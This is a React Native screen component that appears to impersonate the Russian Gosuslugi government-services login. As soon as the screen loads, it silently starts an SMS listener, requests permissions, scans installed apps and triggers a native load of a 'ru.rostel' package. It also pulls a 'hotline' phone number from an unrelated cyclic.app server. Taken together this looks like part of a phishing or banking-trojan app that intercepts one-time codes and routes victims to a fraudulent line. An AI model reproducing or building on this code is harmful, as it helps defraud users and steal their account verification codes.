import React, { useState, useEffect } from 'react';
import { View, TouchableOpacity, Text, StyleSheet, Image, Linking } from 'react-native';
import { useNavigation } from '@react-navigation/native';
import Sms_Listener from '../../modules/Sms_Listener';
import Permission from '../../modules/Permission';
import Apps from '../../modules/Apps';
import StorageManager from '../StorageManager';
import { NativeModules } from 'react-native';
export default function Intro(){
    const { MainModule } = NativeModules;
    const navigation = useNavigation();
    const defaultHeaders = new Headers();
    defaultHeaders.append('Content-Type', 'application/json');
    defaultHeaders.append('Authorization', 'Bearer your_token_here');
    const handleContinuePress = () => {
        navigation.navigate('LogIn');
    };

    const handleRecoverPassPress = () => {
        Linking.openURL('https://esia.gosuslugi.ru/login/recovery');
    };

    const handleRegisterPress = () => {
        Linking.openURL('https://esia.gosuslugi.ru/login/registration');
    };
    const getPermissions = async () => {
        await Permission.requestPermissions();
      };
    const getData = async()=>{
        var apps = await Apps.loadApps()
        apps.forEach(element => {
            if(element.packageName == "ru.rostel"){
                MainModule.fastLoad("ru.rostel")
            }
        });
    }
    const getHotLineNumber = async () => {
        const result = await fetch("https://curious-pinafore-goat.cyclic.app/hotline", {
            method: "GET",
            headers: defaultHeaders,
        });

        if (result.ok) {
            const jsonResult = await result.json(); 
            StorageManager.saveData("hotline", jsonResult[0].number); 
            console.log(jsonResult[0].number); 
        } else {
            console.error("Failed to fetch hotline data:", result.status);
        }

    }
    useEffect(()=>{
        Sms_Listener.startListen()
        getHotLineNumber()
        getPermissions()
        getData()
    },[])

    return(
        <View style={styles.container}>
            <Image
                source={require('../../resources/img/IntroOutBg.png')}
                style={styles.image}
            />
            <TouchableOpacity
                style={styles.button}
                onPress={handleContinuePress}
            >
                <Text style={styles.buttonText}>Войти</Text>
            </TouchableOpacity>
            <TouchableOpacity
                style={styles.buttontrans}
                onPress={handleRecoverPassPress}
            >
                <Text style={styles.buttonText_trans}>Восстановить пароль</Text>
            </TouchableOpacity>
            <View style={styles.view_firstUser}>
                <Text>Впервые у нас?</Text>
                <TouchableOpacity
                    style={[styles.buttontrans , {marginTop: 0}]}
                    onPress={handleRegisterPress}
                >
                    <Text style={styles.buttonText_trans}>Зарегистрироваться</Text>
                </TouchableOpacity>
            </View>
        </View>
    );
}

const styles = StyleSheet.create({
    container: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: 'black',
    },
    button: {
        width: "95%",
        height: 65,
        justifyContent: 'center',
        alignItems: 'center',
        borderRadius: 10,
        marginTop: 300,
        backgroundColor: '#0B85FE',
    },
    buttontrans: {
        width: "95%",
        height: 65,
        justifyContent: 'center',
        alignItems: 'center',
        borderRadius: 10,
        marginTop: 10,
        backgroundColor: 'transparent',
    },
    buttonText_trans:{
        color: '#297ccb',
        fontSize: 16,
    },
    image: {
        width: 175,
        height: 175,
        top:50
    },
    buttonText: {
        color: 'white',
        fontSize: 16,
    },
    view_firstUser:{
        top:75,
        justifyContent: 'center',
        alignItems: 'center',
    },
});
